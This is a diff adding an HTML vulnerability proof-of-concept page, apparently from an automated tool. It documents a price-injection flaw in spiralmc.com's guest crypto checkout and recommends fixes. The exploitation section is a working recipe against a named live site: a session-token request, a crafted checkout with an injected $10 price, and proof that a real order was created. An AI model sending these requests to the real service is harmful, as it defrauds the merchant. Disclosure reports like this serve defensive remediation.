@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BlockageGuard PoC — spiralmc.com Price Injection</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+         background: #0d1117; color: #c9d1d9; min-height: 100vh; }
+  header { background: #161b22; border-bottom: 1px solid #30363d; padding: 20px 40px;
+           display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
+  header a { color: #58a6ff; text-decoration: none; font-size: 0.85rem; }
+  header h1 { font-size: 1.2rem; color: #f0f6fc; }
+  .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
+  .warning { background: #3d1a00; border: 1px solid #f85149; border-radius: 8px;
+             padding: 16px 20px; margin-bottom: 24px; }
+  .warning strong { color: #f85149; }
+  h2 { color: #f0f6fc; margin: 24px 0 12px; }
+  h3 { color: #e3b341; margin: 20px 0 8px; font-size: 0.95rem; }
+  p, li { font-size: 0.88rem; color: #8b949e; line-height: 1.6; margin-bottom: 8px; }
+  ul { margin-left: 20px; }
+  .proof-box { background: #0d2018; border: 1px solid #3fb950; border-radius: 8px;
+               padding: 16px; margin: 16px 0; }
+  .proof-box h4 { color: #3fb950; font-size: 0.85rem; margin-bottom: 8px; }
+  pre { background: #1c2128; border: 1px solid #30363d; border-radius: 6px;
+        padding: 14px; font-size: 0.78rem; overflow-x: auto; color: #c9d1d9;
+        white-space: pre; font-family: monospace; line-height: 1.5; margin: 8px 0 16px; }
+  .highlight { color: #f85149; font-weight: bold; }
+  .ok { color: #3fb950; }
+  .sev { display: inline-block; background: #f851491a; color: #f85149; border: 1px solid #f85149;
+         border-radius: 4px; padding: 3px 10px; font-size: 0.72rem; font-weight: 700; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.82rem; margin: 12px 0; }
+  th { background: #161b22; color: #f0f6fc; padding: 8px 12px; text-align: left;
+       border: 1px solid #30363d; }
+  td { padding: 8px 12px; border: 1px solid #30363d; color: #8b949e; }
+  footer { text-align: center; padding: 40px; color: #484f58; font-size: 0.8rem; }
+</style>
+</head>
+<body>
+<header>
+  <div>
+    <a href="index.html">&#x2190; Back to PoC Index</a>
+    <h1 style="margin-top:6px">&#x1F4B8; spiralmc.com &mdash; Price Injection (F-149)</h1>
+  </div>
+  <span class="sev">CRITICAL</span>
+</header>
+<div class="container">
+  <div class="warning">
+    <strong>&#x26A0;&#xFE0F; Authorized Use Only</strong> &mdash; This PoC documents a confirmed
+    vulnerability discovered under written authorization. Do not reproduce against systems
+    you do not own or have explicit written permission to test.
+  </div>
+
+  <h2>Vulnerability Summary</h2>
+  <p>
+    The <code>POST /api/checkout/crypto</code> endpoint on spiralmc.com accepts client-supplied
+    <code>price</code> fields inside the <code>items[]</code> array for product types prefixed
+    with <code>acc_</code>. The server passes this attacker-controlled price directly to the
+    HoodPay payment API, creating a real, live payment order at the injected price rather than
+    the legitimate server-side product price.
+  </p>
+  <ul>
+    <li><strong>Root cause:</strong> Server trusts client-supplied price for <code>acc_*</code> item types; no server-side price lookup.</li>
+    <li><strong>HoodPay minimum:</strong> $10.00 (attacker cannot go lower; $0 is rejected by payment processor).</li>
+    <li><strong>Impact:</strong> Any visitor can purchase any account product for $10 regardless of true price.</li>
+    <li><strong>Authentication required:</strong> None &mdash; guest checkout via <code>customer</code> object (see F-150).</li>
+  </ul>
+
+  <h2>Proof of Exploitation</h2>
+
+  <div class="proof-box">
+    <h4>&#x2713; Live Proof &mdash; Order #104 (2026-04-24)</h4>
+    <table>
+      <tr><th>Field</th><th>Value</th></tr>
+      <tr><td>Order Number</td><td>#104</td></tr>
+      <tr><td>Product</td><td>acc_easyanticheat (legitimate price ~$90)</td></tr>
+      <tr><td>Injected Price</td><td class="highlight">$10.00</td></tr>
+      <tr><td>HoodPay endAmount</td><td class="highlight">$10.00 (confirmed via HoodPay API)</td></tr>
+      <tr><td>HoodPay Payment ID</td><td>4be106da-5d4e-4614-9119-4c16110acb47 (Order #96, 2026-04-20)</td></tr>
+      <tr><td>Status</td><td>Live payment URL generated, open for payment</td></tr>
+    </table>
+  </div>
+
+  <h3>Step 1 &mdash; Obtain Anonymous Session Token</h3>
+  <p>The session endpoint issues a token per request with no authentication or rate limiting:</p>
+  <pre>GET /api/session HTTP/1.1
+Host: spiralmc.com
+
+Response:
+{"token":"&lt;64-char-hex-session-token&gt;"}</pre>
+
+  <h3>Step 2 &mdash; Send Crafted Checkout Request</h3>
+  <p>Include a <code>customer</code> object (bypasses login) and inject your desired price in <code>items[].price</code>:</p>
+  <pre>POST /api/checkout/crypto HTTP/1.1
+Host: spiralmc.com
+Content-Type: application/json
+Authorization: Bearer &lt;session-token&gt;
+
+{
+  "customer": {
+    "email": "attacker@example.com",
+    "username": "attacker"
+  },
+  "items": [
+    {
+      "type": <span class="highlight">"acc_easyanticheat"</span>,
+      "quantity": 1,
+      <span class="highlight">"price": 10</span>
+    }
+  ],
+  "coupon_code": ""
+}</pre>
+
+  <h3>Step 3 &mdash; Server Creates Real $10 HoodPay Payment</h3>
+  <pre>HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "success": true,
+  "order_id": 104,
+  "payment": {
+    <span class="highlight">"endAmount": 10.0,</span>
+    "currency": "USD",
+    "status": "pending",
+    "paymentUrl": "https://checkout.hoodpay.io/..."
+  }
+}</pre>
+
+  <h3>Step 4 &mdash; Verify via HoodPay Public API</h3>
+  <pre>GET https://hoodpay.io/v1/public/payments/hosted-page/4be106da-5d4e-4614-9119-4c16110acb47
+
+Response:
+{
+  <span class="highlight">"endAmount": 10.0,</span>
+  "status": "pending",
+  ...
+}
+<span class="ok">&#x2713; HoodPay independently confirms $10 payment for $90 product</span></pre>
+
+  <h2>Recommended Fix</h2>
+  <ul>
+    <li>Remove client-supplied <code>price</code> from the <code>items[]</code> array entirely.</li>
+    <li>Perform a server-side product price lookup by <code>type</code> ID in the database before passing to HoodPay.</li>
+    <li>Validate that the <code>items[].price</code> field, if accepted for any reason, matches the canonical DB price &plusmn; allowed discount.</li>
+    <li>Add authentication check: require a valid session (not just a guest token) to complete checkout.</li>
+  </ul>
+
+</div>
+<footer>BlockageGuard AutoProver &middot; F-149 &middot; spiralmc.com Price Injection &middot; 2026-04-24</footer>
+</body>
+</html>
